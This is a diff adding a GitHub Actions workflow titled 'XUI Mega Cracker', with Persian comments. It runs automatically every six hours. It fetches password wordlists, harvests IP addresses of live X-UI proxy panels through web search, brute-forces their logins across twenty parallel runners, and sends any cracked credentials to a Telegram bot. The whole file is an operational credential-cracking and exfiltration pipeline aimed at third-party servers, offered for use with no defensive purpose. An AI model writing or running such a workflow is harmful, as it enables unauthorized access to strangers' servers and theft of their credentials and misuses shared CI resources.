@@ -1,0 +1,143 @@
+name: XUI Mega Cracker
+
+on:
+  workflow_dispatch:  # اجرای دستی
+  schedule:
+    - cron: '0 */6 * * *'  # هر ۶ ساعت خودکار
+
+env:
+  BOT_TOKEN: ${{ secrets.BOT_TOKEN }}
+  CHAT_ID: ${{ secrets.CHAT_ID }}
+
+jobs:
+  # ===== مرحله ۱: دریافت لیست‌های عظیم =====
+  fetch-wordlists:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      
+      - name: Setup Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.11'
+      
+      - name: Install dependencies
+        run: pip install requests
+      
+      - name: Download & merge 10 massive wordlists
+        run: python xui_mega_cracker.py --fetch-wordlists
+      
+      - name: Upload wordlists as artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: wordlists
+          path: wordlists/
+          retention-days: 1
+
+  # ===== مرحله ۲: پیدا کردن آیپی‌های زنده =====
+  fetch-ips:
+    runs-on: ubuntu-latest
+    needs: fetch-wordlists
+    steps:
+      - uses: actions/checkout@v4
+      
+      - name: Setup Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.11'
+      
+      - name: Install dependencies
+        run: |
+          pip install requests googlesearch-python beautifulsoup4
+      
+      - name: Download wordlists from previous job
+        uses: actions/download-artifact@v4
+        with:
+          name: wordlists
+          path: wordlists/
+      
+      - name: Fetch live X-UI IPs (no API keys)
+        run: python xui_mega_cracker.py --fetch-ips
+      
+      - name: Upload IPs as artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: ips
+          path: ips.txt
+          retention-days: 1
+
+  # ===== مرحله ۳: کرک کردن با ماتریس ۲۰ تایی =====
+  crack:
+    runs-on: ubuntu-latest
+    needs: [fetch-wordlists, fetch-ips]
+    strategy:
+      matrix:
+        chunk: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+      max-parallel: 20  # حداکثر ۲۰ رانر همزمان
+      fail-fast: false   # اگه یکی fail بشه بقیه ادامه بدن
+    steps:
+      - uses: actions/checkout@v4
+      
+      - name: Setup Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.11'
+      
+      - name: Install dependencies
+        run: pip install requests
+      
+      - name: Download artifacts
+        uses: actions/download-artifact@v4
+        with:
+          name: wordlists
+          path: wordlists/
+      
+      - name: Download IPs
+        uses: actions/download-artifact@v4
+        with:
+          name: ips
+          path: ./
+      
+      - name: Run cracker (chunk ${{ matrix.chunk }})
+        env:
+          CHUNK_ID: ${{ matrix.chunk }}
+          TOTAL_CHUNKS: 20
+        run: |
+          python xui_mega_cracker.py --chunk $CHUNK_ID --total-chunks $TOTAL_CHUNKS
+      
+      - name: Upload results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: results-chunk-${{ matrix.chunk }}
+          path: good.txt
+          retention-days: 7
+
+  # ===== مرحله ۴: جمع‌آوری نهایی و ارسال گزارش =====
+  final-report:
+    runs-on: ubuntu-latest
+    needs: crack
+    if: always()
+    steps:
+      - uses: actions/checkout@v4
+      
+      - name: Download all results
+        uses: actions/download-artifact@v4
+        with:
+          pattern: results-chunk-*
+          path: results/
+          merge-multiple: true
+      
+      - name: Merge and send final report
+        run: |
+          cat results/*.txt > all_results.txt 2>/dev/null || echo "No results found" > all_results.txt
+          python -c "
+          import requests
+          import os
+          TOKEN = '${{ secrets.BOT_TOKEN }}'
+          CHAT = '${{ secrets.CHAT_ID }}'
+          with open('all_results.txt', 'r') as f:
+              content = f.read().strip() or '⚠️ No credentials found'
+          url = f'https://api.telegram.org/bot{TOKEN}/sendMessage'
+          requests.post(url, json={'chat_id': CHAT, 'text': f'📊 Final Report:\n\n{content[:3900]}'})
+          "
